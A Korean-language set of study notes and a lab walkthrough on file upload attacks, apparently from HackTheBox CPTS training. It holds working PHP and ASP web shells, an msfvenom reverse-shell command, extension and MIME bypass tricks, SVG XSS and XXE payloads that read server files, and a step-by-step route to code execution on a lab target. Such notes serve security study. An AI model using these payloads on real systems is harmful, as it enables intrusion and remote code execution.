# 파일 업로드 공격

## 파일 업로드 공격



> [파일 업로드 우회에 대한 Burp Suite Certified Practitioner 연구 노트](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#file-uploads)

### 웹 셸



| **웹 셸**                                                                        | **설명**                                                                                                       |
| ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------ |
| `<?php file_get_contents('/etc/passwd'); ?>`                                   | 기본 PHP 파일 읽기                                                                                                 |
| `<?php system('hostname'); ?>`                                                 | 기본 PHP 명령 실행                                                                                                 |
| `<?php echo file_get_contents('/etc/hostname'); ?>`                            | 백엔드 서버에서 (호스트 이름)을 가져오기 위해 실행되는 PHP 스크립트 [임의 파일 업로드](https://academy.hackthebox.com/module/136/section/1260) |
| `<?php system($_REQUEST['cmd']); ?>`                                           | 기본 PHP 웹 셸                                                                                                   |
| `<?php echo shell_exec($_GET[ "cmd" ]); ?>`                                    | shell\_exec 함수를 사용하는 대체 PHP 웹셸.                                                                              |
| `<% eval request('cmd') %>`                                                    | 기본 ASP 웹 셸                                                                                                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | PHP 리버스 쉘 생성                                                                                                 |
| `/usr/share/seclists/Web-Shells`                                               | CFM, FuzzDB, JSP, Laudanum, Magento, PHP, Vtiger 및 WordPress와 같은 프레임워크용 웹셸 목록입니다.                            |
| [PHP 웹 셸](https://github.com/Arrexel/phpbash)                                  | PHP 웹 셸                                                                                                      |
| [PHP 리버스 쉘](https://github.com/pentestmonkey/php-reverse-shell)                | PHP 리버스 쉘                                                                                                    |
| [웹/리버스 쉘](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)   | 웹 셸 및 리버스 셸 목록                                                                                               |

### 우회



| **명령**                                                                                                                             | **설명**                                                                                                                                                                                         |
| ---------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **클라이언트측 우회**                                                                                                                      | [클라이언트 측 파일 형식 유효성 검사 우회](https://academy.hackthebox.com/module/136/section/1280)                                                                                                              |
| `[CTRL+SHIFT+C]`                                                                                                                   | 페이지 검사기 전환                                                                                                                                                                                     |
| **블랙리스트 우회**                                                                                                                       | [블랙리스트 필터](https://academy.hackthebox.com/module/136/section/1288) Burp Suite intruder를 사용하여 가능한 확장자를 나열한 단일 파일 이름을 업로드합니다. 그런 다음 침입자를 다시 사용하여 업로드된 모든 파일에 대해 GET 요청을 수행하여 대상에서 PHP 실행을 식별합니다. |
| `shell.phtml`                                                                                                                      | 흔하지 않은 확장                                                                                                                                                                                      |
| `shell.pHp`                                                                                                                        | 사례 조작                                                                                                                                                                                          |
| [PHP 확장](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | PHP 확장 목록                                                                                                                                                                                      |
| [ASP 확장](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)                | ASP 확장 목록                                                                                                                                                                                      |
| [웹 확장](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)                            | 웹 확장 목록                                                                                                                                                                                        |
| **화이트리스트 우회**                                                                                                                      | [화이트리스트 확장 프로그램](https://academy.hackthebox.com/module/136/section/1289)                                                                                                                       |
| `shell.jpg.php`                                                                                                                    | 이중 확장 우회 예시                                                                                                                                                                                    |
| `shell.php.jpg`                                                                                                                    | 리버스 더블 익스텐션                                                                                                                                                                                    |

#### 추가 클라이언트 측



> 클라이언트 측 html 코드는 을 제거하고 `validate()`선택적으로 `onchange`및 `accept`값을 지워 파일 업로드 유효성 검사 우회를 허용하도록 변경됩니다.

[![업로드-클라이언트-측-html](https://github.com/missteek/cpts-quick-references/raw/main/images/uploads-client-side-html.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/uploads-client-side-html.png)

#### 추가 단어 목록 스크립트



> 문자 삽입 - 화이트 또는 블랙 목록에서 파일 업로드 필터를 우회하기 위해 가능한 파일 이름 목록을 생성하기 위한 이전/이후 확장입니다.

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
    done
done
```

### 콘텐츠/유형 우회



| **명령**                                                                                                           | **설명**                                                                |
| ---------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| [웹 콘텐츠 유형](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)            | [웹 콘텐츠 유형](https://academy.hackthebox.com/module/136/section/1290) 목록 |
| [콘텐츠 유형](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | 모든 콘텐츠 유형 목록                                                          |
| [파일 서명](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)                                                | 파일 서명/매직 바이트 목록                                                       |

> 업로드되는 파일의 페이로드 코드 예를 파일 본문 상단에 `<?php echo file_get_contents('/flag.txt'); ?>`추가 `GIF8`하고 파일 이름을 `shell.php`. 그러면 `Content-Type:`위의 단어 목록을 사용하는 Burp Suite Intruder의 주입 페이로드 위치가 됩니다.

### 제한된 업로드



| **잠재적인 공격**  | **파일 유형**               |
| ------------ | ----------------------- |
| `XSS`        | HTML, JS, SVG, GIF      |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS`        | 우편번호, JPG, PNG          |

## 수업 과정



### 업로드 필터



> 이 [웹 서버 연습에서는](https://academy.hackthebox.com/module/136/section/1290) 클라이언트측, 블랙리스트, 화이트리스트, 콘텐츠 유형 및 MIME 유형 필터를 사용하여 업로드된 파일이 이미지인지 확인합니다. 지금까지 배운 모든 공격을 결합하여 이러한 필터를 우회하고 PHP 파일을 업로드하고 "/flag.txt"에서 플래그를 읽어보세요.

> DOM을 로드하기 전에 클라이언트측\
> HTML 스크립트 함수 유효성 검사가 지워졌습니다.

[![유형-필터-운동-step1](https://github.com/missteek/cpts-quick-references/raw/main/images/type-filters-exercise-step1.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/type-filters-exercise-step1.png)

> 블랙리스트 및 화이트리스트\
> 확장자에 다양한 문자를 삽입하여 파일 이름을 퍼징하면 유효한 파일 이름이 드러납니다.`shell.jpg:.phar`

> 유효한 파일 이름과 확장자를 결정합니다.

> 콘텐츠 유형 및 MIME 유형\
> 콘텐츠 유형과 MIME 유형 조합은 백엔드와 콘텐츠 유형의 퍼징 단어 목록으로 확인되며 유효한 유형은 다음과 같이 식별됩니다.

```
Content-Type: image/gif
GIF8
```

[![유형 필터 운동 단계](https://github.com/missteek/cpts-quick-references/raw/main/images/type-filters-exercise-step3.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/type-filters-exercise-step3.png)

> 민감한 정보 가져오기 플래그: `GET /profile_images/shell.jpg:.phar`.

### 업로드의 XSS 및 XXE



> Burp Sutie 공인 실무자 연구 연습 및 참고 사항:

* [SVG 이미지 업로드를 통한 BSCP - XXE](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#xxe-via-svg-image-upload)
* [BSCP - XSS SVG 업로드](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#xss-svg-upload)

> 이 파일 업로드 실습에는 임의 파일 업로드로부터 보호되어야 하는 취약한 업로드 기능이 포함되어 있습니다. 그러나 파일 내용은 서버 측을 실행하여 XXE를 사용하여 중요한 파일을 읽거나 저장된 XSS를 트리거할 수 있습니다.

> SVG 이미지 파일 내의 XSS: `htb.svg`, 대상에 업로드되었습니다.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

> XML SVG 파일이 업로드되면 XSS가 트리거됩니다.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

> 위의 내용은 인덱스 랜딩 페이지에서 렌더링되고 의 내용을 검색합니다 `/flag.txt`.

> 아래 XML 페이로드 파일 업로드를 사용하여 서버에서 실행을 방지하기 위해 Base64를 사용하여 PHP 파일의 소스 코드를 검색할 수 있습니다.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

[![xxe-svg-업로드-base64](https://github.com/missteek/cpts-quick-references/raw/main/images/xxe-svg-upload-base64.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xxe-svg-upload-base64.png)

## 기술 평가 - 파일 업로드 공격



> [추가 운동](https://academy.hackthebox.com/module/136/section/1310)

> 귀하는 회사의 전자 상거래 웹 애플리케이션에 대한 침투 테스트를 수행하기로 계약했습니다. 웹 애플리케이션은 초기 단계이므로 찾을 수 있는 파일 업로드 양식만 테스트하게 됩니다. 이 모듈에서 배운 내용을 활용하여 업로드 양식이 작동하는 방식과 다양한 검증을 우회하여 백엔드 서버에서 원격 코드 실행을 얻는 방법을 이해해 보세요.

### 파일 업로드 식별



> 웹 애플리케이션 문의 양식의 열거 및 검색에는 스크린샷 파일 업로드 기능이 포함되어 있습니다.

[![업로드 기술 평가 페이지](https://github.com/missteek/cpts-quick-references/raw/main/images/upload-skills-assess-page.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/upload-skills-assess-page.png)

> Burp Suite를 가로채서 퍼징 파일 업로드를 시작하세요.

#### 고객 입장에서



> `checkfile(this)`JavaScript 소스 코드 호출에 대한 클라이언트 측 html 검사를 제거합니다 .

```
<input name="uploadFile" id="uploadFile" type="file" class="custom-file-input" id="inputGroupFile02" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
<label id="inputGroupFile01" class="custom-file-label" for="inputGroupFile02" aria-describeby="inputGroupFileAddon02">
```

[![업로드 기술은 클라이언트 측을 평가합니다.](https://github.com/missteek/cpts-quick-references/raw/main/images/upload-skills-assess-clientside.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/upload-skills-assess-clientside.png)

#### SVG XML 업로드



> XML 콘텐츠가 포함된 SVG 확장을 업로드할 수 있는 경우 열거합니다.

[![업로드-기술-평가-xml-svg](https://github.com/missteek/cpts-quick-references/raw/main/images/upload-skills-assess-xml-svg.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/upload-skills-assess-xml-svg.png)

> 파일을 POC로 읽었습니다 `/etc/hostname`.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
<svg>&xxe;</svg>
```

> 웹 디렉토리, 블랙리스트, 화이트리스트 필터 등을 찾으려면 모든 PHP 파일의 소스 코드를\
> 받으세요 `upload.php`.

```
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

> 위의 PHP 소스 코드는 이름이 바뀐 경로와 파일 이름을 보여줍니다. 예를 들면 다음과 같습니다.`http://94.237.59.206:37111/contact/user_feedback_submissions/230723_test.png`

> apache2.conf의 내용은 로그 파일 이름을 제공하지만 그 외에는 아무것도 제공하지 않습니다.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf"> ]>
<svg>&xxe;</svg>
```

#### 확장 열거



> 유효한 파일 확장자를 확인하려면 Burp Intruder를 실행하세요.\
> [PHP 확장 단어 목록](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

[![업로드 기술 평가 확장](https://github.com/missteek/cpts-quick-references/raw/main/images/upload-skills-assess-extension.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/upload-skills-assess-extension.png)

> 파일 이름 확장자 및 공격 유형에 대한 페이로드 위치 스나이퍼.\
> 유효한 확장자가 다음과 같이 식별되었습니다.`.phar.jpeg`

#### 웹쉘



> 필터를 우회하기 위해 MIME 유형을 사용하여 PHP 웹셸을 만듭니다.

> `shell.phar.jpeg`Linux 마우스패드 편집기에서 와 같이 다음 파일을 생성합니다 .

```
AAAA
<?php echo system($_GET["cmd"]);?>
```

> 다음을 사용하여 MIME 유형을 변경 `hexeditor`하고 값을 바꿔 매직 넘버를 입력합니다 `AAAA`. JPEG의 매직 MIME 유형 바이트 =`FF D8 FF DB`

[![업로드 기술 평가 hexeditor](https://github.com/missteek/cpts-quick-references/raw/main/images/upload-skills-assess-hexeditor.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/upload-skills-assess-hexeditor.png)

> 수정된 webshell 파일을 대상에 업로드합니다.

[![업로드 기술은 웹쉘을 평가합니다.](https://github.com/missteek/cpts-quick-references/raw/main/images/upload-skills-assess-webshelll.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/upload-skills-assess-webshelll.png)

> 이미지 웹셸 파일 업로드가 완료되면 해당 파일을 찾아 `http://1.2.3.4/contact/user_feedback_submissions/230723_shell.phar.jpeg?cmd=cat+/flag.txt`플래그를 얻습니다.

[![업로드 기술 평가 플래그](https://github.com/missteek/cpts-quick-references/raw/main/images/upload-skills-assess-flag.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/upload-skills-assess-flag.png)
